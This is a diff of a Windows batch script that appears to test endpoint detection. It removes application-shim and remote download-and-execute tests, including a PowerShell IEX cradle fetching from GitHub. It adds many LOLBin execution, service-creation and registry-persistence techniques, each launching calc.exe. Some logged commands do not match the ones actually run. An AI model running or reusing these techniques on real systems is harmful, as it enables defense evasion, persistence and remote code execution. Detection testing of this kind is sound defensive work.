@@ -1,117 +1,211 @@
-REM start line 327
-REM end line 440
+REM start line 441
+REM end line 648
 
 
-echo %time% %date% [+] T1138 - App Shim installation for Calc.exe via file decode
-echo -----BEGIN CERTIFICATE----- > shim.64
-echo AgAAAAEAAABzZGJmAnjeAAAAA3ggAAAAAjgHcAM4AWAWQAEAAAABmAwAAABFWEUu >> shim.64
-echo Q0xBQ1IBAAADeA4AAAACOAdwAzgLYAGYAAAAAAN4DgAAAAI4B3ADOCBgAZgAAAAA >> shim.64
-echo A3gOAAAAAjgEcAM4AWABmAAAAAADeA4AAAACOA1wAzgVQAGYAAAAAAN4FAAAAAI4 >> shim.64
-echo EHADOAFgFkABAAAAAZgAAAAAA3gOAAAAAjgScAM4BpABmAAAAAADeBQAAAACOBJw >> shim.64
-echo AzgEkBZAAQAAAAGYAAAAAAN4GgAAAAI4B3ADOASQAZgMAAAAKrpBuRQxAq9SAQAA >> shim.64
-echo AXDgAAAAAVAJOgQMVR/UASJgBgAAAAFgHAAAACNAAQAAAAeQEAAAAO/VHM+BZc5A >> shim.64
-echo oCyA7S3ObrkCcAAAAAALcB4AAAABYHAAAAAJcAYAAAABYIAAAAAJcAYAAAABYLoA >> shim.64
-echo AAAHcH4AAAABYNgAAAAGYHAAAAAFYPAAAAAEkBAAAACpg6GdMzlyTIM54CQnCHDj >> shim.64
-echo CHAyAAAAAWAKAQAACWAUAQAAEGBGAQAAEWCWAQAAAlBqRLEdAQAGAANQakSxHQEA >> shim.64
-echo BgATYLoBAAAJcAwAAAABYLoAAAAIYNgAAAALcAYAAAABYBICAAABeCQCAAABiBAA >> shim.64
-echo AAAyAC4AMQAuADAALgAzAAAAAYhOAAAAewBjAGYAMQBjAGQANQBlAGYALQA2ADUA >> shim.64
-echo OAAxAC0ANAAwAGMAZQAtAGEAMAAyAGMALQA4ADAAZQBkADIAZABjAGUANgBlAGIA >> shim.64
-echo OQB9AAAAAYgKAAAAYwBhAGwAYwAAAAGINAAAAEEAZABkAFAAcgBvAGMAZQBzAHMA >> shim.64
-echo UABhAHIAYQBtAGUAdABlAHIAcwBGAGwAYQBnAHMAAAABiBgAAABSAGUAZABpAHIA >> shim.64
-echo ZQBjAHQARQBYAEUAAAABiBIAAABjAGEAbABjAC4AZQB4AGUAAAABiBQAAABNAGkA >> shim.64
-echo YwByAG8AcwBvAGYAdAAAAAGIBAAAACoAAAABiCwAAABNAGkAYwByAG8AcwBvAGYA >> shim.64
-echo dAAgAEMAbwByAHAAbwByAGEAdABpAG8AbgAAAAGISgAAAE0AaQBjAHIAbwBzAG8A >> shim.64
-echo ZgB0AK4AIABXAGkAbgBkAG8AdwBzAK4AIABPAHAAZQByAGEAdABpAG4AZwAgAFMA >> shim.64
-echo eQBzAHQAZQBtAAAAAYgeAAAANgAuADEALgA3ADYAMAAxAC4AMgAzADQAMAAzAAAA >> shim.64
-echo AYhSAAAANgAuADEALgA3ADYAMAAxAC4AMgAzADQAMAAzACAAKAB3AGkAbgA3AHMA >> shim.64
-echo cAAxAF8AbABkAHIALgAxADYAMAAzADIANQAtADAANgAwADAAKQAAAAGIEgAAAFYA >> shim.64
-echo aQBzAHQAYQBTAFAAMQAAAA== >> shim.64
-echo -----END CERTIFICATE----- >> shim.64
-start "" cmd /c certutil -f -decode shim.64 calc.sdb >nul
-start "" cmd /c sdbinst /q calc.sdb
-timeout 2
-start "" cmd /c sdbinst -u calc.sdb
+start "" cmd /c rundll32 setupapi,InstallHinfSection DefaultInstall 132 calc.inf
 echo Execution Finished at %time% %date% 
-echo Command Excuted: certutil -f -decode shim.64 calc.sdb
-echo Command Excuted: sdbinst -q calc.sdb
-echo Command Excuted: sdbinst -u calc.sdb
-
+echo Command Excuted: rundll32 setupapi,InstallHinfSection DefaultInstall 132 calc.inf
 timeout 5
 
-echo %time% %date% [+] T1138 - App Shim installation for Calc.exe via file download
-
-start "" cmd /c bitsadmin.exe /transfer "JobName" https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/calc-exec.sdb "%cd%\calc2.sdb"
-start "" cmd /c sdbinst /q calc2.sdb
-timeout 2
-start "" cmd /c sdbinst -u calc2.sdb
-echo Execution Finished at %time% %date% 
-echo Command Excuted: sdbinst -q calc2.sdb
-echo Command Excuted: sdbinst -u calc2.sdb
-
-timeout 5
-
-
-echo **********************************************
-echo *      Testing LOLBAS PAYLOADS               *
-echo **********************************************
-REM Payloads in this section were generated based on information in https://github.com/api0cradle/LOLBAS
-
-echo %time% %date% [+] Testing msiexec exec
-start "" cmd /c msiexec /q /i https://github.com/op7ic/EDR-Testing-Script/blob/master/Payloads/notepad.msi?raw=true  
-start "" cmd /c msiexec /i https://github.com/op7ic/EDR-Testing-Script/blob/master/Payloads/notepad.msi?raw=true
+echo %time% %date% [+] Testing Shdocvw exec via rundll32
+echo [InternetShortcut] > C:\windows\temp\url.url
+echo URL=file:///c:\windows\system32\calc.exe >> C:\windows\temp\url.url
+start "" cmd /c rundll32.exe shdocvw.dll, OpenURL C:\windows\temp\url.url
 echo Execution Finished at %time% %date%
-echo Command Excuted: msiexec /q /i https://github.com/op7ic/EDR-Testing-Script/blob/master/Payloads/notepad.msi?raw=true 
-echo Command Excuted: msiexec /i https://github.com/op7ic/EDR-Testing-Script/blob/master/Payloads/notepad.msi?raw=true
+echo Command Excuted: [InternetShortcut] > C:\windows\temp\url.url
+echo Command Excuted: URL=file:///c:\windows\system32\calc.exe >> C:\windows\temp\url.url
+echo Command Excuted: rundll32.exe shdocvw.dll, OpenURL C:\windows\temp\url.url
+
 timeout 5
-echo %time% %date% [+] Testing diskshadow exec
-echo exec calc.exe > diskshadow.txt
-start "" cmd /c  diskshadow.exe /s diskshadow.txt
-echo Execution Finished at %time% %date%  
-echo Command Excuted: exec calc.exe > diskshadow.txt
-echo Command Excuted: diskshadow.exe /s diskshadow.txt
+
+echo %time% %date% [+] Testing csc exec
+
+echo public class x{public static void Main(){System.Diagnostics.Process.Start("calc");}} >>  payload.cs
+
+start "" cmd /c  C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe /out:payload.exe payload.cs
+start "" cmd /c  C:\Windows\Microsoft.NET\Framework64\v2.0.50727\csc.exe /out:payload.exe payload.cs
+start "" cmd /c  C:\Windows\Microsoft.NET\Framework\v4.0.30319\Csc.exe /out:payload.exe payload.cs
+start "" cmd /c  C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Csc.exe /out:payload.exe payload.cs
+start "" cmd /c  payload.exe
+echo Execution Finished at %time% %date%
+echo Command Excuted: public class x{public static void Main(){System.Diagnostics.Process.Start("calc");}} >>  payload.cs
+echo Command Excuted: C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe /out:payload.exe payload.cs
+echo Command Excuted: C:\Windows\Microsoft.NET\Framework64\v2.0.50727\csc.exe /out:payload.exe payload.cs
+echo Command Excuted: C:\Windows\Microsoft.NET\Framework\v4.0.30319\Csc.exe /out:payload.exe payload.cs
+echo Command Excuted: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Csc.exe /out:payload.exe payload.cs
+echo Command Excuted: payload.exe 
 timeout 5
-echo %time% %date% [+] Testing Esentutl.exe download & exec
-start "" cmd /c  esentutl.exe /y \\live.sysinternals.com\tools\adrestore.exe /d adrestore.exe /o  
-start "" cmd /c  adrestore.exe   
-echo Execution Finished at %time% %date%  
-echo Command Excuted: esentutl.exe /y \\live.sysinternals.com\tools\adrestore.exe /d adrestore.exe /o
-echo Command Excuted: adrestore.exe
+echo %time% %date% [+] Testing advpack exec
+start "" cmd /c rundll32.exe advpack.dll,RegisterOCX calc.exe
+echo Execution Finished at %time% %date%
+echo Command Excuted: rundll32.exe advpack.dll,RegisterOCX calc.exe
 timeout 5
-echo %time% %date% [+] Testing replace.exe download & exec
-start "" cmd /c replace \\live.sysinternals.com\tools\adrestore.exe adrestore2.exe /A
-start "" cmd /c adrestore2.exe   
-echo Execution Finished at %time% %date% 
-echo Command Excuted: replace \\live.sysinternals.com\tools\adrestore.exe adrestore2.exe /A
-echo Command Excuted: adrestore2.exe  
+echo %time% %date% [+] Testing Scriptrunner exec
+start "" cmd /c scriptrunner.exe -appvscript calc.exe   
+echo Execution Finished at %time% %date%
+echo Command Excuted: scriptrunner.exe -appvscript calc.exe
+
 timeout 5
-echo %time% %date% [+] Testing SyncAppvPublishingServer.vbs download & exec
-start "" cmd /c  C:\Windows\System32\SyncAppvPublishingServer.vbs "n;(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))"
-echo Execution Finished at %time% %date% 
-echo Command Excuted: C:\Windows\System32\SyncAppvPublishingServer.vbs "n;(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))"
+
+echo %time% %date% [+] Testing SC exec
+start "" cmd /c sc create evilservice binPath= "C:\windows\system32\calc.exe" DisplayName= "evilservice" start= auto     
+start "" cmd /c sc start evilservice     
+echo Execution Finished at %time% %date%
+echo Command Excuted: sc create evilservice binPath= "C:\windows\system32\cmd.exe /c calc.exe" DisplayName= "evilservice" start= auto  
+echo Command Excuted: sc start evilservice
+
 timeout 5
-echo %time% %date% [+] Testing HH.exe download
-REM HH.exe does not handle HTTPS
-start "" cmd /c  HH.exe http://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt
-echo Execution Finished at %time% %date% 
-echo Command Excuted: HH.exe http://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt
+
+echo %time% %date% [+] Testing Register-cimprovider exec
+start "" cmd /c Register-cimprovider -path "AllTheThings.dll"   
+echo Execution Finished at %time% %date%
+echo Command Excuted: Register-cimprovider -path "AllTheThings.dll"   
+
 timeout 5
-echo %time% %date% Testing ieexec.exe download & execute"exec"
-start "" cmd /c  ieexec.exe https://github.com/op7ic/EDR-Testing-Script/blob/master/Payloads/notepad.msi?raw=true  
-echo Execution Finished at %time% %date% 
-echo Command Excuted: ieexec.exe https://github.com/op7ic/EDR-Testing-Script/blob/master/Payloads/notepad.msi?raw=true  
+
+echo %time% %date% [+] Testing control.exe exec
+start "" cmd /c control.exe AllTheThings.dll
+echo Execution Finished at %time% %date%
+echo Command Excuted: control.exe AllTheThings.dll
+
+
 timeout 5
-echo %time% %date% [+] Testing Setupapi driever installation & exec
-echo ^; DRIVER.INF > calc.inf
-echo ^; Copyright (c) Microsoft Corporation.  All rights reserved. >> calc.inf
-echo [Version] >> calc.inf
-echo Signature = "$CHICAGO$" >> calc.inf
-echo Class=61883 >> calc.inf
-echo ClassGuid={7EBEFBC0-3200-11d2-B4C2-00A0C9697D17} >> calc.inf
-echo Provider=%Msft% >> calc.inf
-echo DriverVer=06/21/2006,6.1.7600.16385 >> calc.inf
-echo [DestinationDirs] >> calc.inf
-echo DefaultDestDir = 1 >> calc.inf
-echo [DefaultInstall] >> calc.inf
-echo AddReg = CalcStart >> calc.inf
-echo [CalcStart]
-echo HKLM,Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce,Install,,cmd.exe /c """calc.exe""" >> calc.inf
+
+echo %time% %date% [+] Testing manage-bde.wsf exec
+set comspec=C:\windows\system32\calc.exe
+start "" cmd /c cscript C:\windows\system32\manage-bde.wsf 
+echo Execution Finished at %time% %date%
+echo Command Excuted: set comspec=C:\windows\system32\calc.exe
+echo Command Excuted: cscript C:\windows\system32\manage-bde.wsf 
+REM Reset ComSpec
+set comspec=C:\WINDOWS\system32\cmd.exe
+
+timeout 5
+
+echo %time% %date% [+] Testing AppVLP.exe exec
+start "" cmd /c "C:\Program Files (x86)\Microsoft Office\root\client\AppVLP.exe" calc.exe
+echo Execution Finished at %time% %date%
+echo Command Excuted: "C:\Program Files (x86)\Microsoft Office\root\client\AppVLP.exe" calc.exe
+
+timeout 5
+
+echo %time% %date% [+] Testing ScriptRunner.exe exec
+start "" cmd /c C:\Windows\System32\ScriptRunner.exe -appvscript cmd.exe
+echo Execution Finished at %time% %date%
+echo Command Excuted: C:\Windows\System32\ScriptRunner.exe -appvscript calc.exe
+
+timeout 5
+
+echo %time% %date% [+] Testing Pester.bat (PS3.0) exec
+start "" cmd /c C:\Program Files (x86)\WindowsPowerShell\Modules\Pester\3.4.0\bin\Pester.bat help  "; Start-Process calc.exe"
+echo Execution Finished at %time% %date%
+echo Command Excuted: C:\Program Files (x86)\WindowsPowerShell\Modules\Pester\3.4.0\bin\Pester.bat help  "; Start-Process calc.exe"
+
+timeout 5
+
+echo %time% %date% [+] Testing powershellcustomhost.exe exec
+echo Start-Process calc.exe > calc.ps1
+start "" cmd /c "C:\Program Files\IIS\Microsoft Web Deploy V3\Scripts\powershellcustomhost.exe" calc.ps1
+echo Execution Finished at %time% %date%
+echo Command Excuted: "C:\Program Files\IIS\Microsoft Web Deploy V3\Scripts\powershellcustomhost.exe" calc.ps1
+
+timeout 5
+
+echo %time% %date% [+] Testing PresentationHosts.exe exec
+start "" cmd /c PresentationHost.exe file://c:\windows\system32\calc.exe
+echo Execution Finished at %time% %date%
+echo Command Excuted: PresentationHost.exe file://c:\windows\system32\calc.exe
+timeout 5
+
+
+echo %time% %date% [+] Testing Command Processor.exe exec
+start "" cmd /c reg add "HKCU\Software\Microsoft\Command Processor" /v AutoRun /d "start calc.exe"
+start "" cmd /c cmd.exe
+echo Execution Finished at %time% %date%
+echo Command Excuted: reg add "HKCU\Software\Microsoft\Command Processor" /v AutoRun /d "start calc.exe"
+echo Command Excuted: cmd.exe
+timeout 5
+
+echo %time% %date% [+] Testing gpup.exe exec
+start "" cmd /c "C:\Program Files (x86)\Notepad++\updater\gpup.exe -w whatever -e c:\Windows\System32\calc.exe"
+echo Execution Finished at %time% %date%
+echo Command Excuted: C:\Program Files (x86)\Notepad++\updater\gpup.exe -w whatever -e c:\Windows\System32\calc.exe
+
+timeout 5
+
+echo ^; DRIVER.INF > calc2.inf
+echo ^; Copyright (c) Microsoft Corporation.  All rights reserved. >> calc2.inf
+echo [Version] >> calc2.inf
+echo Signature = "$CHICAGO$" >> calc2.inf
+echo Class=61883 >> calc2.inf
+echo ClassGuid={7EBEFBC0-3200-11d2-B4C2-00A0C9697D17} >> calc2.inf
+echo Provider=%Msft% >> calc2.inf
+echo DriverVer=06/21/2006,6.1.7600.16385 >> calc2.inf
+echo [DestinationDirs] >> calc2.inf
+echo DefaultDestDir = 1 >> calc2.inf
+echo [DefaultInstall] >> calc2.inf
+echo AddReg = CalcStart >> calc2.inf
+echo [CalcStart] >> calc2.inf
+echo HKLM,Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce,Install,,cmd.exe /c """calc.exe""" >> calc2.inf
+
+echo %time% %date% [+] Testing VBoxDrvInst.exe exec
+start "" cmd /c "C:\Program Files\Oracle\VirtualBox Guest Additions\VBoxDrvInst.exe" driver executeinf calc2.inf 
+echo Execution Finished at %time% %date%
+echo Command Excuted: "C:\Program Files\Oracle\VirtualBox Guest Additions\VBoxDrvInst.exe" driver executeinf calc2.inf 
+
+timeout 5
+
+echo %time% %date% [+] Testing InstallHinfSection exec
+start "" cmd /c "C:\Program Files (x86)\Citrix\ICA Client\Drivers64\Usbinst.exe" InstallHinfSection "DefaultInstall 128 calc2.inf"
+echo Execution Finished at %time% %date%
+echo Command Excuted: "C:\Program Files (x86)\Citrix\ICA Client\Drivers64\Usbinst.exe" InstallHinfSection "DefaultInstall 128 calc2.inf"
+
+timeout 5
+
+echo %time% %date% [+] Testing Atbroker exec
+start "" cmd /c "C:\Windows\System32\Atbroker.exe C:\windows\system32\calc.exe"
+start "" cmd /c "C:\Windows\SysWOW64\Atbroker.exe C:\windows\system32\calc.exe"
+echo Execution Finished at %time% %date%
+echo Command Excuted: "C:\Windows\System32\Atbroker.exe C:\windows\system32\calc.exe"
+echo Command Excuted: "C:\Windows\SysWOW64\Atbroker.exe C:\windows\system32\calc.exe"
+
+
+timeout 5
+
+echo %time% %date% [+] Testing MSCONFIG exec
+echo ^<?xml version="1.0" ?^> > %windir%\System32\mscfgtlc.xml
+echo ^<MSCONFIGTOOLS^> >> %windir%\System32\mscfgtlc.xml
+echo ^<a NAME="LOLBin" PATH="%windir%\System32\cmd.exe" DEFAULT_OPT="" ADV_OPT="/c calc.exe" HELP="LOLBin MSCONFIGTOOLS"^/^> >> %windir%\System32\mscfgtlc.xml
+echo ^</MSCONFIGTOOLS^> >> %windir%\System32\mscfgtlc.xml
+start "" cmd /c msconfig.exe
+echo Execution Finished at %time% %date%
+echo Command Excuted: msconfig.exe
+
+
+
+timeout 5
+
+
+
+echo %time% %date% [+] Testing DNSCMD DLL exec
+start "" cmd /c dnscmd ops_dc /config /serverlevelplugindll AllTheThings.dll 
+echo Execution Finished at %time% %date%
+echo Command Excuted: dnscmd ops_dc /config /serverlevelplugindll AllTheThings.dll 
+
+timeout 5
+
+echo %time% %date% [+] Testing JAVA DLL exec
+start "" cmd /c java.exe -agentpath:AllTheThings.dll 
+start "" cmd /c java.exe -agentlib:AllTheThings.dll 
+echo Execution Finished at %time% %date%
+echo Command Excuted: java.exe -agentpath:AllTheThings.dll 
+echo Command Excuted: java.exe -agentlib:AllTheThings.dll  
+
+echo %time% %date% [+] Testing JAVA DLL exec
+start "" cmd /c java.exe -agentpath:AllTheThings.dll 
+start "" cmd /c java.exe -agentlib:AllTheThings.dll 
+echo Execution Finished at %time% %date%
+echo Command Excuted: java.exe -agentpath:AllTheThings.dll 
+echo Command Excuted: java.exe -agentlib:AllTheThings.dll  
+
+timeout 5
